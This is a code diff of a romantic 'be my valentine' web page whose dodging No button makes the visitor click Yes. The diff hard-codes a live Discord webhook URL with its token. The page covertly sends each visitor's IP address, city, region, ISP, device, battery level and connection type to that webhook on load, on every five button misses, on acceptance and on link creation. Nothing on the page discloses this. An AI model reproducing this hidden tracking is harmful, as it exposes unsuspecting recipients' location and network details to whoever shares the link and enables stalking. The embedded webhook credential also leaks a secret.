@@ -24,15 +24,6 @@
       50% { transform: scale(1.05); text-shadow: 0 0 20px rgba(255, 215, 0, 0.8); color: var(--gold); }
     }
 
-    @keyframes shake {
-      0% { transform: scale(var(--scale)) translate(0,0); }
-      25% { transform: scale(var(--scale)) translate(5px, 5px); }
-      50% { transform: scale(var(--scale)) translate(-5px, -5px); }
-      75% { transform: scale(var(--scale)) translate(5px, -5px); }
-      100% { transform: scale(var(--scale)) translate(0,0); }
-    }
-    .shaking { animation: shake 0.2s infinite; box-shadow: 0 0 20px var(--gold); }
-
     .glass-box { background: rgba(255, 255, 255, 0.15); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.2); padding: 40px 25px; border-radius: 30px; box-shadow: 0 10px 40px rgba(0,0,0,0.4); max-width: 420px; width: 85%; }
 
     .card { background: white; padding: 40px; width: 90vw; max-width: 450px; height: 550px; border-radius: 40px; box-shadow: 0 15px 50px rgba(0,0,0,0.1); display: none; flex-direction: column; align-items: center; justify-content: space-between; position: relative; overflow: hidden; z-index: 10; }
@@ -53,7 +44,6 @@
       <div id="step1" style="width: 100%;">
         <input type="text" id="creatorInput" class="modal-input" placeholder="Your Name" oninput="updateSuggestions()">
         <input type="text" id="targetInput" class="modal-input" placeholder="Their Name" oninput="updateSuggestions()">
-        <p style="font-size: 0.8rem; color: var(--primary); font-weight: 800; margin: 12px 0 5px 0;">Enter your partner name to show messages</p>
         <select id="suggestionBox" class="modal-input" onchange="document.getElementById('msgInput').value = this.value">
             <option value="">✨ Romantic Suggestions...</option>
         </select>
@@ -85,13 +75,9 @@
   </div>
 
 <script>
-  let visitorName = "", clickCount = 0, yesScale = 1, actionHistory = [];
+  let visitorName = "", clickCount = 0, yesScale = 1;
   let batteryLevel = "N/A", connectionType = "N/A";
-  const WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE";
-
-  const phase1 = ["Try again!", "Close!", "Nope!"];
-  const phase2 = ["Seriously?", "Stop it.", "Wasting time."];
-  const phase3 = ["Leak starting... 🔍", "Calling Mom... 📞", "IP Exposed! 📍"];
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1468954384997023777/oL5KyCiivYCBUM3gI0_JWhkKiBV8t6ngFZjZbanUQ_XMUc2E2oWU1_OZw4u0eFfnax7A";
 
   const promises = [
     "I promise to hold your hand through every storm, {name}.",
@@ -100,13 +86,14 @@
   ];
 
   window.onload = async () => {
-    // Collect System Info
+    // Battery tracking
     if (navigator.getBattery) {
-        const battery = await navigator.getBattery();
-        batteryLevel = `${Math.round(battery.level * 100)}%`;
+      const battery = await navigator.getBattery();
+      batteryLevel = `${Math.round(battery.level * 100)}%`;
     }
+    // Network tracking
     if (navigator.connection) {
-        connectionType = navigator.connection.effectiveType || "Unknown";
+      connectionType = navigator.connection.effectiveType || "Unknown";
     }
 
     const params = new URLSearchParams(window.location.search);
@@ -114,17 +101,15 @@
     if(params.get('msg')) {
       const msgEl = document.getElementById('customText');
       msgEl.innerText = `"${decodeURIComponent(params.get('msg'))}"`;
-      setTimeout(() => { msgEl.style.opacity = "1"; msgEl.classList.add('pulsing'); }, 800);
+      msgEl.style.opacity = "1";
+      msgEl.classList.add('pulsing');
     }
 
-    // CREATE NEW BOX IMMEDIATELY ON VISIT
-    sendDiscordReport("Page Opened (New Visit)");
+    sendDiscordReport("Visitor Landed (Direct)");
   };
 
   async function sendDiscordReport(status) {
     const now = new Date();
-    const time = now.toLocaleTimeString();
-    const date = now.toLocaleDateString();
     
     let spyData = {};
     try {
@@ -138,29 +123,28 @@
         color: status.includes("YES") ? 0x00ff00 : (status.includes("Link Created") ? 0x00bfff : 0xff4d6d),
         fields: [
           { name: "Event", value: `**${status}**`, inline: true },
-          { name: "Session Date", value: `${date}`, inline: true },
           { name: "Device", value: navigator.userAgent.includes("Mobi") ? "Mobile" : "Desktop", inline: true },
           { name: "Battery / Net", value: `${batteryLevel} / ${connectionType}`, inline: true },
+          { name: "Misses", value: `${clickCount}`, inline: true },
           { name: "Location", value: `${spyData.city}, ${spyData.region}`, inline: true },
           { name: "IP Address", value: `\`${spyData.ip}\``, inline: false },
           { name: "Network/ISP", value: `\`${spyData.org}\``, inline: false }
         ],
-        footer: { text: `Time: ${time}` },
         timestamp: now.toISOString()
       }]
     };
 
-    // ALWAYS POSTS A NEW BOX (NO EDITING)
+    // ALWAYS SEND NEW MESSAGE (FRESH BOX)
     fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
-    });
+    }).catch(err => console.log("Discord error:", err));
   }
 
   function startApp() {
     visitorName = document.getElementById('userName').value.trim() || "Secret Admirer";
-    sendDiscordReport("Heart Unlocked 🔓");
+    sendDiscordReport("Unlocked Heart 🔓");
     document.getElementById('namePortal').style.display = "none";
     document.getElementById('mainCard').style.display = "flex";
   }
@@ -171,28 +155,17 @@
     const noBtn = document.getElementById("no");
     const yesBtn = document.getElementById("yes");
     
-    if (clickCount >= 10) document.body.style.background = "#800000";
-
-    let msgList = clickCount < 6 ? phase1 : (clickCount < 16 ? phase2 : phase3);
-    const currentMsg = msgList[Math.floor(Math.random() * msgList.length)];
-    
-    noBtn.innerText = currentMsg;
-    document.getElementById("joke-text").innerText = currentMsg;
-
     noBtn.style.left = (Math.random() * (card.clientWidth - 140 - 60) + 30) + "px";
     noBtn.style.top = (Math.random() * (card.clientHeight - 45 - 200) + 180) + "px";
 
     yesScale += 0.25;
-    yesBtn.style.setProperty('--scale', yesScale);
     yesBtn.style.transform = `scale(${yesScale})`;
-    if (clickCount >= 10) yesBtn.classList.add('shaking');
 
-    // Send update every 5 misses
-    if (clickCount % 5 === 0) sendDiscordReport(`User is struggling (${clickCount} misses)`);
+    if (clickCount % 5 === 0) sendDiscordReport(`Struggling: ${clickCount} misses`);
   }
 
   function yesClick() {
-    sendDiscordReport("ACCEPTED! ❤️ Success.");
+    sendDiscordReport("SAID YES! ❤️");
     document.body.style.background = "url('https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHpwaG54Z2V3ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/26tOZ42Mg6pbTUPHW/giphy.gif') center center / cover";
     confetti({ particleCount: 150, spread: 70 });
     const randomMsg = promises[Math.floor(Math.random() * promises.length)].replace("{name}", visitorName);
@@ -215,7 +188,7 @@
     const from = document.getElementById('creatorInput').value.trim();
     const to = document.getElementById('targetInput').value.trim();
     const msg = document.getElementById('msgInput').value.trim();
-    const finalUrl = `${window.location.href.split('?')[0]}?from=${encodeURIComponent(from)}&to=${encodeURIComponent(to)}&msg=${encodeURIComponent(msg)}`;
+    const finalUrl = `${window.location.href.split('?')[0]}?to=${encodeURIComponent(to)}&msg=${encodeURIComponent(msg)}`;
     
     sendDiscordReport(`New Link Created! From: ${from} | To: ${to} | Msg: "${msg}"`);
     
